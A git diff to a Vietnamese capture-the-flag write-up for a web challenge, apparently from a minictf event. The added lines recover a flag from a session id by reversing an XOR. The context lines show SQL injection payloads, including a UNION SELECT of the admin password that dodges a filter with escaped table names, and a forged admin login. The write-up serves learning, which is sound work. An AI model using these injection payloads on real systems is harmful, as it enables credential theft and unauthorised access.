@@ -138,7 +138,7 @@ show_source(__FILE__);
     + Như đã nói ở trên, mình đã thực hiện nhiều cách để leak ra được pass của admin nhưng điều không có kết quả.
     + Lúc này mình nhớ tới 2 part trước, mình đã dùng querry để có dc flag, vậy tại sao mình lại không dùng cách tương tự.
     + Câu trả lời nằm ở việc nếu muốn có được flag thì phải tự hiện querry trên bản USER, nhưng src lại không cho phép điều đó.
-    + Sau hồi khi thử nhiều cách thì mình đã thử chuyển User sang Hex để đánh lừa fillter.
+    + Sau khi thử nhiều cách thì mình đã thử chuyển User sang Hex để đánh lừa fillter.
     + Payload của mình:
       ```sql
         ?name=hehehehe%27%20union%20select%20null,password%20from%20u%26%22\0075\0073\0065\0072\0073%22%20where%20username=%27admin%27--%20-
@@ -167,10 +167,22 @@ show_source(__FILE__);
 
  - Hàm này bắt buộc chúng ta phải gửi username dài hơn key ( ở đây là Flag O ) để tránh trường hợp return Null.
 ```sql
-
 username=aaaa'+UNION+SELECT+'admiaaaaaa.aaaaaaaaaaaaaaaaaaaaaaaaaaa
 aaaan', '21232 £297a57a5a743894a0e4a801fc3&password=admin
 ```
- 
+ - Bây giờ mình sẽ gửi payload lên server để test.
+
+   ![image](https://github.com/TooBunReal/minictf-w1/assets/89735990/e09ebb6c-742a-42a8-a94a-63cca67688c6)
+ - Sau khi gửi thành công, session id của chúng ta nhận được là
+```
+54-80-26-18-80-12-17-13-4-62-18-21-20-7-7-62-22-9-4-15-62-17-20-21-62-21-14-6-4-21-9-4-19-62-8-18-62-18-81-62-2-81-81-13-62-9-4-9-4-9-4-9-4-9-4-9-4-62-9-4-9-4-9-4-9-4-9-4-9-4-28-107-97-97-97-97-97-97-97
+```
+- Sử dụng kĩ thuật reverse xor ta sẽ có được flag ở session id trên.
+- Flag :```W1{s1mple_stuff_when_put_together_is_s0_c00l_hehehehehehe_hehehehehehe}```
+  
+## ﻿ Hồi Kết
+- Các chall lần này khá hay, nó hội tụ rất nhiều kĩ thuật mà một người chơi web cần có. Thật tiếc vì mình đã không thể clear trước khi kết thúc giải. Dù sao mình vẫn mong có cơ hội thử sức với nhiều chall khác và cả minictf binary sắp tới.
+
+
 
 
